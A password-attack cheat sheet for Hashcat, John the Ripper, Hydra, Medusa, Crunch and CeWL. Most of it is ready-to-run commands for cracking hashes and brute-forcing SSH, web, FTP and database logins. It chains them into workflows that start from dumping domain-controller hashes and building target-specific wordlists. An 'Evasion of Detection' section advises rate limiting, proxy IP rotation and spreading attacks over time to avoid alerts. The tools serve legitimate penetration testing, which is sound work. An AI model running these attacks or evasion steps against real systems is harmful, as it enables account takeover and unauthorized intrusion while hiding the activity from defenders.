# Password Attack Command Line Tools Detailed Reference

## 1. Hashcat - World's Fastest Password Recovery Tool

### Core Functionality
Hashcat is the world's fastest and most advanced password recovery tool, supporting 300+ hash types and multiple attack modes.

### Attack Modes
- **0 (Straight)**: Dictionary attack
- **1 (Combination)**: Combination attack
- **3 (Brute-force)**: Brute force attack
- **6 (Hybrid Wordlist + Mask)**: Hybrid dictionary + mask
- **7 (Hybrid Mask + Wordlist)**: Hybrid mask + dictionary
- **9 (Association)**: Association attack

### Hash Type Examples
- **0**: MD5
- **1000**: NTLM
- **1400**: SHA256
- **1800**: SHA512
- **2500**: WPA/WPA2
- **500**: md5crypt, MD5(Unix)
- **10000**: Django (SHA-256)

### Basic Usage
```bash
# Dictionary attack
hashcat -a 0 -m 1000 hash.txt wordlist.txt

# Brute force
hashcat -a 3 -m 0 hash.txt ?a?a?a?a?a

# Rule attack
hashcat -a 0 -m 1000 hash.txt wordlist.txt -r rules/best64.rule

# Mask attack
hashcat -a 3 -m 1000 hash.txt ?d?d?d?d?d?d

# Resume interrupted session
hashcat --restore
```

### Advanced Options
```bash
# Performance optimization
hashcat -O -w 3 -m 1000 hash.txt wordlist.txt

# Output format
hashcat --show --outfile cracked.txt hash.txt

# Custom character set
hashcat -a 3 -m 1000 hash.txt -1 ?l?d ?1?1?1?1?1

# Multiple GPU support
hashcat -D 1,2 -m 1000 hash.txt wordlist.txt
```

### Practical Points
- Supports CPU and GPU Acceleration
- Built-in 300+ Hash Types
- Powerful Rule Engine
- Session Recovery and State Saving

## 2. John the Ripper - Dynamic Password Cracking Tool

### Core Functionality
John the Ripper is a fast password cracking tool, especially adept at handling various encrypted password hashes.

### Attack Modes
- **--single**: Single crack mode (uses username information)
- **--wordlist**: Dictionary attack mode
- **--incremental**: Incremental mode (brute force)
- **--external**: External mode (custom scripts)

### Basic Usage
```bash
# Auto-detect hash type
john hashes.txt

# Dictionary attack
john --wordlist=wordlist.txt hashes.txt

# Single crack mode
john --single hashes.txt

# Incremental mode
john --incremental hashes.txt

# Show cracked passwords
john --show hashes.txt
```

### Hash Format Support
- **Unix crypt(3)**: Traditional Unix passwords
- **MD5-based**: Modern Unix passwords
- **NTLM**: Windows password hashes
- **Kerberos**: Kerberos tickets
- **ZIP/RAR**: Archive passwords
- **PDF/Office**: Document passwords

### Advanced Options
```bash
# Use rules
john --wordlist=wordlist.txt --rules hashes.txt

# Multi-threading
john --fork=4 hashes.txt

# Session recovery
john --restore

# Custom configuration
john --config=john.conf hashes.txt
```

### Practical Points
- Automatic Hash Type Detection
- Powerful Single Crack Mode
- Supports Multiple File Formats
- Session Management and Recovery

## 3. Hydra - Fast Network Login Cracking Tool

### Core Functionality
Hydra is a very fast network login cracking tool supporting 50+ protocols.

### Supported Protocols
- **Web**: HTTP, HTTPS, HTTP-Proxy
- **Databases**: MySQL, MSSQL, Oracle, PostgreSQL
- **Remote Access**: SSH, Telnet, RDP, VNC
- **Email**: SMTP, POP3, IMAP
- **File Transfer**: FTP, SFTP
- **Other**: SNMP, LDAP, SMB, Redis

### Basic Usage
```bash
# Basic SSH brute force
hydra -l admin -P passwords.txt ssh://192.168.1.100

# Web form brute force
hydra -l admin -P passwords.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"

# Multiple users brute force
hydra -L users.txt -P passwords.txt ftp://192.168.1.100

# SSL connection
hydra -l admin -P passwords.txt -s 443 https://192.168.1.100

# Custom error message
hydra -l admin -P passwords.txt http-get "/admin:F=Access Denied"
```

### Advanced Options
```bash
# Proxy setup
export HYDRA_PROXY_HTTP=http://proxy:8080
hydra -l admin -P passwords.txt http://target.com

# Session recovery
hydra -R

# Concurrency control
hydra -t 4 -l admin -P passwords.txt ssh://192.168.1.100

# Output results
hydra -o results.txt -l admin -P passwords.txt ssh://192.168.1.100
```

### Practical Points
- Extremely Fast Network Brute Force Speed
- 50+ Protocol Support
- Flexible Form Brute Force Syntax
- Proxy and SSL Support

## 4. Medusa - Parallel Login Brute Force Tool

### Core Functionality
Medusa is a parallel login brute force tool focused on speed and modular design.

### Supported Modules
- **cvs**: CVS sessions
- **ftp**: FTP/FTPS sessions
- **http**: HTTP authentication
- **imap**: IMAP sessions
- **mssql**: MSSQL sessions
- **mysql**: MySQL sessions
- **pop3**: POP3 sessions
- **postgres**: PostgreSQL sessions
- **rdp**: RDP sessions
- **ssh**: SSH sessions
- **telnet**: Telnet sessions
- **vnc**: VNC sessions

### Basic Usage
```bash
# SSH brute force
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh

# Multiple users brute force
medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ftp

# HTTP basic authentication
medusa -h 192.168.1.100 -u admin -P passwords.txt -M http -m AUTH BASIC

# SSL connection
medusa -h 192.168.1.100 -u admin -P passwords.txt -M pop3 -s

# Custom port
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh -n 2222
```

### Advanced Options
```bash
# Output log
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh -O results.log

# Additional checks
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh -e ns

# Module parameters
medusa -h 192.168.1.100 -u admin -P passwords.txt -M http -m AUTH BASIC -m URL /admin
```

### Practical Points
- Modular Architecture Design
- Parallel Processing Capability
- Flexible Module Parameters
- Detailed Log Output

## 5. Crunch - Custom Dictionary Generation Tool

### Core Functionality
Crunch is a custom dictionary generation tool that can generate password combinations based on specified character sets and lengths.

### Basic Usage
```bash
# Basic dictionary generation
crunch 4 6 0123456789

# Custom character set
crunch 6 8 abcdefghijklmnopqrstuvwxyz

# Include special characters
crunch 5 5 -t @,%^&

# Save to file
crunch 4 6 0123456789 -o wordlist.txt

# Memory limit
crunch 6 8 -b 10MB -o START
```

### Character Set Definitions
- **@**: Lowercase letters (abcdefghijklmnopqrstuvwxyz)
- **,**: Uppercase letters (ABCDEFGHIJKLMNOPQRSTUVWXYZ)
- **%**: Numbers (0123456789)
- **^**: Special characters (!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~)

### Advanced Options
```bash
# Exclude characters
crunch 4 6 -f charset.lst mixalpha-numeric-all-space -o wordlist.txt

# Pattern generation
crunch 8 8 -t pass@%%%

# Statistics
crunch 6 6 -p password test admin

# Resume generation
crunch 6 6 -s password -o wordlist.txt
```

### Practical Points
- Precise Control of Dictionary Size
- Supports Complex Pattern Generation
- Memory and Disk Management
- Integration with Other Tools

## 6. Cewl - Custom Dictionary Generation Tool

### Core Functionality
Cewl is a crawler tool that can extract words from target websites to generate custom password dictionaries.

### Basic Usage
```bash
# Basic crawling
cewl https://target.com -w wordlist.txt

# Specify depth
cewl -d 3 https://target.com -w wordlist.txt

# Minimum word length
cewl -m 5 https://target.com -w wordlist.txt

# Include metadata
cewl -a https://target.com -w wordlist.txt

# Authenticated crawling
cewl --auth_type basic --auth_user admin --auth_pass password https://target.com -w wordlist.txt
```

### Advanced Options
```bash
# Proxy support
cewl --proxy_host proxy --proxy_port 8080 https://target.com -w wordlist.txt

# Custom User-Agent
cewl -u "Custom User Agent" https://target.com -w wordlist.txt

# Include numbers
cewl --with-numbers https://target.com -w wordlist.txt

# Convert special characters
cewl --convert-umlauts https://target.com -w wordlist.txt
```

### Practical Points
- Generate Target-Related Dictionaries
- Supports Authentication and Proxy
- Extract Metadata and Comments
- Can Be Combined with Other Tools

## 7. Other Auxiliary Tools

### John Conversion Tools
- **1password2john**: 1Password database conversion
- **keepass2john**: KeePass database conversion
- **office2john**: Office document password extraction
- **pdf2john**: PDF document password extraction
- **zip2john**: ZIP file password extraction

### Hashcat Tool Suite
- **hashcat-utils**: Advanced password cracking toolset
- **rulegen**: Rule generation tool
- **statsgen**: Statistical analysis tool

### Dictionary Processing Tools
- **rsmangler**: Dictionary transformation tool
- **maskprocessor**: Mask processing tool
- **princeprocessor**: PRINCE attack processing tool

## Tool Combination Usage Strategy

### 1. Offline Hash Cracking Workflow
```bash
# Step 1: Extract hashes
secretsdump.py domain/user:password@dc > hashes.txt

# Step 2: Identify hash type
hashcat --identify hashes.txt

# Step 3: Dictionary attack
hashcat -a 0 -m 1000 hashes.txt rockyou.txt

# Step 4: Rule attack
hashcat -a 0 -m 1000 hashes.txt rockyou.txt -r rules/dive.rule

# Step 5: Brute force
hashcat -a 3 -m 1000 hashes.txt ?a?a?a?a?a?a
```

### 2. Online Service Brute Force Workflow
```bash
# Step 1: Target reconnaissance
nmap -sV target.com

# Step 2: Dictionary preparation
cewl https://target.com -d 2 -m 4 -w custom_dict.txt

# Step 3: SSH brute force
hydra -L users.txt -P custom_dict.txt ssh://target.com

# Step 4: Web form brute force
hydra -l admin -P custom_dict.txt http-post-form "/login:user=^USER^&pass=^PASS^:F=error"

# Step 5: Database brute force
medusa -h target.com -u sa -P custom_dict.txt -M mssql
```

### 3. Custom Dictionary Generation Workflow
```bash
# Step 1: Website crawling
cewl https://target.com -d 3 -m 4 -w website_words.txt

# Step 2: Dictionary transformation
rsmangler --file website_words.txt --output mangled_dict.txt

# Step 3: Pattern generation
crunch 6 8 -t company@%%% -o pattern_dict.txt

# Step 4: Merge dictionaries
cat website_words.txt mangled_dict.txt pattern_dict.txt rockyou.txt > final_dict.txt

# Step 5: Deduplicate and sort
sort -u final_dict.txt > unique_dict.txt
```

## Best Practices and Considerations

### 1. Legal and Ethics
- **Absolute Authorization**: Password Attacks Must Obtain Explicit Written Authorization
- **Scope Limitation**: Strictly Comply with Testing Scope, Do Not Exceed Authorization Boundaries
- **Minimal Impact**: Control Attack Frequency to Avoid DoS
- **Data Protection**: Properly Handle Cracked Sensitive Information

### 2. Technical Best Practices
- **Dictionary Selection**: Customize Dictionaries Based on Targets to Improve Success Rate
- **Attack Sequence**: Dictionary Attack First, Then Rule Attack, Finally Brute Force
- **Performance Optimization**: Reasonably Allocate System Resources, Monitor Hardware Temperature
- **Result Validation**: Verify Authenticity and Validity of Cracking Results

### 3. Performance Optimization
- **Hardware Utilization**: Fully Utilize GPU and Multi-core CPU
- **Memory Management**: Reasonably Set Memory Usage Limits
- **Disk I/O**: Use SSD to Improve Dictionary Read Speed
- **Network Optimization**: Control Concurrent Connections to Avoid Being Banned

### 4. Evasion of Detection
- **Rate Control**: Control Request Frequency to Avoid Triggering Alerts
- **IP Rotation**: Use Proxy Pools to Rotate IP Addresses
- **User Agent**: Use Realistic User-Agent Strings
- **Time Dispersion**: Distribute Attack Time to Avoid Concentrated Detection

## Common Issues and Solutions

### 1. Performance Issues
- **GPU Drivers**: Ensure Latest GPU Drivers Are Installed
- **Insufficient Memory**: Reduce Dictionary Size or Increase Swap Space
- **CPU Overheating**: Reduce Thread Count or Improve Cooling
- **Disk Full**: Clean Up Temporary Files or Increase Storage Space

### 2. Network Issues
- **Connection Timeout**: Increase Timeout and Retry Count
- **IP Banned**: Use Proxy or Reduce Attack Frequency
- **Authentication Failed**: Verify Username and Password Format
- **Protocol Not Supported**: Confirm Target Service Supported Protocol Version

### 3. Dictionary Issues
- **Dictionary Too Large**: Split Dictionary Files for Batch Processing
- **Dictionary Too Small**: Combine Multiple Dictionary Sources
- **Encoding Issues**: Ensure Dictionary Files Use Correct Encoding
- **Duplicate Entries**: Use sort -u for Deduplication

### 4. Result Validation
- **False Positives**: Manually Verify Cracking Results
- **Partial Match**: Check if Hash Is Complete
- **Format Error**: Confirm Output Format Is Correct
- **Permission Issues**: Verify Actual Permissions of Cracked Credentials
